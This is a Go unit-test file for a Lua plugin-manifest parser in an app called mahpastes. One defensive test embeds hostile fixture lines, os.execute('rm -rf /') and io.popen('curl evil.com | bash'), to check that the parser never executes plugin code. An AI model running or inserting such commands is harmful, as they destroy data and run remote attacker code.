package plugin

import (
	"testing"
)

func TestParseManifest_HelloWorld(t *testing.T) {
	source := `-- Hello World Plugin for mahpastes
-- Demonstrates the plugin API

Plugin = {
    name = "Hello World",
    version = "1.0.0",
    description = "A simple example plugin that logs clip events",
    author = "mahpastes",

    -- No network access needed
    network = {},

    -- No filesystem access needed
    filesystem = {
        read = false,
        write = false,
    },

    -- Subscribe to clip events
    events = {"app:startup", "app:shutdown", "clip:created", "clip:deleted"},

    -- No scheduled tasks
    schedules = {},
}

-- Called when the app starts
function on_startup()
    log("Hello World plugin started!")
end
`

	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if manifest.Name != "Hello World" {
		t.Errorf("Expected name 'Hello World', got '%s'", manifest.Name)
	}
	if manifest.Version != "1.0.0" {
		t.Errorf("Expected version '1.0.0', got '%s'", manifest.Version)
	}
	if manifest.Description != "A simple example plugin that logs clip events" {
		t.Errorf("Expected description mismatch, got '%s'", manifest.Description)
	}
	if manifest.Author != "mahpastes" {
		t.Errorf("Expected author 'mahpastes', got '%s'", manifest.Author)
	}
	if manifest.Filesystem.Read != false {
		t.Errorf("Expected filesystem.read = false")
	}
	if manifest.Filesystem.Write != false {
		t.Errorf("Expected filesystem.write = false")
	}
	if len(manifest.Events) != 4 {
		t.Errorf("Expected 4 events, got %d", len(manifest.Events))
	}
	expectedEvents := []string{"app:startup", "app:shutdown", "clip:created", "clip:deleted"}
	for i, ev := range expectedEvents {
		if i < len(manifest.Events) && manifest.Events[i] != ev {
			t.Errorf("Expected event %d to be '%s', got '%s'", i, ev, manifest.Events[i])
		}
	}
}

func TestParseManifest_AutoArchive(t *testing.T) {
	source := `-- Auto-Archive Old Clips Plugin
-- Archives clips older than 24 hours

Plugin = {
    name = "Auto Archive Old",
    version = "1.0.0",
    description = "Automatically archives clips older than 24 hours",
    author = "mahpastes",

    network = {},
    filesystem = {
        read = false,
        write = false,
    },

    events = {"app:startup"},

    -- Run every hour
    schedules = {
        {name = "archive_old_clips", interval = 3600},
    },
}

function archive_old_clips()
    -- Implementation
end
`

	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if manifest.Name != "Auto Archive Old" {
		t.Errorf("Expected name 'Auto Archive Old', got '%s'", manifest.Name)
	}
	if len(manifest.Schedules) != 1 {
		t.Fatalf("Expected 1 schedule, got %d", len(manifest.Schedules))
	}
	if manifest.Schedules[0].Name != "archive_old_clips" {
		t.Errorf("Expected schedule name 'archive_old_clips', got '%s'", manifest.Schedules[0].Name)
	}
	if manifest.Schedules[0].Interval != 3600 {
		t.Errorf("Expected interval 3600, got %d", manifest.Schedules[0].Interval)
	}
}

func TestParseManifest_WithNetwork(t *testing.T) {
	source := `Plugin = {
    name = "Network Plugin",
    version = "1.0.0",

    network = {
        ["api.example.com"] = {"GET", "POST"},
        ["cdn.example.com"] = {"GET"},
    },

    filesystem = {
        read = true,
        write = false,
    },

    events = {},
    schedules = {},
}
`

	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if manifest.Name != "Network Plugin" {
		t.Errorf("Expected name 'Network Plugin', got '%s'", manifest.Name)
	}
	if !manifest.Filesystem.Read {
		t.Errorf("Expected filesystem.read = true")
	}
	if manifest.Filesystem.Write {
		t.Errorf("Expected filesystem.write = false")
	}

	// Check network permissions
	apiMethods, ok := manifest.Network["api.example.com"]
	if !ok {
		t.Errorf("Expected network permission for api.example.com")
	} else if len(apiMethods) != 2 {
		t.Errorf("Expected 2 methods for api.example.com, got %d", len(apiMethods))
	}

	cdnMethods, ok := manifest.Network["cdn.example.com"]
	if !ok {
		t.Errorf("Expected network permission for cdn.example.com")
	} else if len(cdnMethods) != 1 || cdnMethods[0] != "GET" {
		t.Errorf("Expected GET for cdn.example.com, got %v", cdnMethods)
	}
}

func TestParseManifest_MissingName(t *testing.T) {
	source := `Plugin = {
    version = "1.0.0",
}
`

	_, err := ParseManifest(source)
	if err == nil {
		t.Error("Expected error for missing name")
	}
}

func TestParseManifest_NoPluginTable(t *testing.T) {
	source := `-- Just some Lua code
function foo()
    return "bar"
end
`

	_, err := ParseManifest(source)
	if err == nil {
		t.Error("Expected error for missing Plugin table")
	}
}

func TestParseManifest_MaliciousCode(t *testing.T) {
	// This test ensures that malicious code in the plugin source is NOT executed
	// The parser should only extract the Plugin table declaratively
	source := `-- This would be dangerous if executed
os.execute("rm -rf /")
io.popen("curl evil.com | bash")

Plugin = {
    name = "Innocent Plugin",
    version = "1.0.0",
    network = {},
    filesystem = {read = false, write = false},
    events = {},
    schedules = {},
}
`

	// The parser should succeed without executing the dangerous code
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if manifest.Name != "Innocent Plugin" {
		t.Errorf("Expected name 'Innocent Plugin', got '%s'", manifest.Name)
	}
}

func TestParseManifestWithSettings(t *testing.T) {
	source := `
Plugin = {
  name = "Test Plugin",
  version = "1.0.0",
  settings = {
    {key = "api_key", type = "password", label = "API Key", description = "Your API key"},
    {key = "endpoint", type = "text", label = "Endpoint", default = "https://api.example.com"},
    {key = "enabled", type = "checkbox", label = "Enable feature", default = true},
    {key = "mode", type = "select", label = "Mode", options = {"fast", "slow"}, default = "fast"}
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	if len(manifest.Settings) != 4 {
		t.Errorf("Expected 4 settings, got %d", len(manifest.Settings))
	}

	// Check first setting
	if manifest.Settings[0].Key != "api_key" {
		t.Errorf("Expected key 'api_key', got '%s'", manifest.Settings[0].Key)
	}
	if manifest.Settings[0].Type != "password" {
		t.Errorf("Expected type 'password', got '%s'", manifest.Settings[0].Type)
	}

	// Check default values
	if manifest.Settings[1].Default != "https://api.example.com" {
		t.Errorf("Expected default 'https://api.example.com', got '%v'", manifest.Settings[1].Default)
	}
	if manifest.Settings[2].Default != true {
		t.Errorf("Expected default true, got '%v'", manifest.Settings[2].Default)
	}

	// Check select options
	if len(manifest.Settings[3].Options) != 2 {
		t.Errorf("Expected 2 options, got %d", len(manifest.Settings[3].Options))
	}
}

func TestParseManifestWithSettings_InvalidType(t *testing.T) {
	source := `
Plugin = {
  name = "Test Plugin",
  version = "1.0.0",
  settings = {
    {key = "invalid", type = "unknown", label = "Invalid Type"}
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	// Invalid type should be skipped
	if len(manifest.Settings) != 0 {
		t.Errorf("Expected 0 settings (invalid type skipped), got %d", len(manifest.Settings))
	}
}

func TestParseManifestWithSettings_SelectWithoutOptions(t *testing.T) {
	source := `
Plugin = {
  name = "Test Plugin",
  version = "1.0.0",
  settings = {
    {key = "mode", type = "select", label = "Mode"}
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	// Select without options should be skipped
	if len(manifest.Settings) != 0 {
		t.Errorf("Expected 0 settings (select without options skipped), got %d", len(manifest.Settings))
	}
}

func TestParseManifestWithSettings_MissingRequiredFields(t *testing.T) {
	source := `
Plugin = {
  name = "Test Plugin",
  version = "1.0.0",
  settings = {
    {key = "missing_type", label = "Missing Type"},
    {type = "text", label = "Missing Key"},
    {key = "missing_label", type = "text"}
  }
}
`
	manifest, err := ParseManifest(source)
	if err != nil {
		t.Fatalf("ParseManifest failed: %v", err)
	}

	// All three should be skipped due to missing required fields
	if len(manifest.Settings) != 0 {
		t.Errorf("Expected 0 settings (missing required fields), got %d", len(manifest.Settings))
	}
}
